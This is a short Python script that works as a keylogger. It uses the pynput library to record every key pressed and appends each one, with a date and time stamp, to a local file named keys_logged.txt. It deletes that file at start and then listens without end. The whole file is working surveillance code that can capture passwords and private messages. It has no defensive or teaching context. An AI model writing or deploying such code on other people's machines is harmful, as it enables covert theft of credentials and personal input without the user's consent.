from pynput.keyboard import Key, Listener
from datetime import date, datetime
import os

os.remove("keys_logged.txt")
keys = []

#this function prints the pressed key
def on_press(key):
   keys.append(key)
   write_to_file(keys)

#this is a function that writes the keys, with dates to the file
def write_to_file(keys):
   today =  date.today()
   c = datetime.now()
   time_now = c.strftime('%H:%M:%S') #this is the current time
   with open("keys_logged.txt", "w") as file:
      for key in keys:
         k = str(key).replace("'", "")
         file.write(str(today))
         file.write(time_now)
         file.write("  ")
         file.write(k)
         file.write("\n")

#this is where the logging starts
while True:
   
   with Listener(on_press = on_press) as listener:
      listener.join()
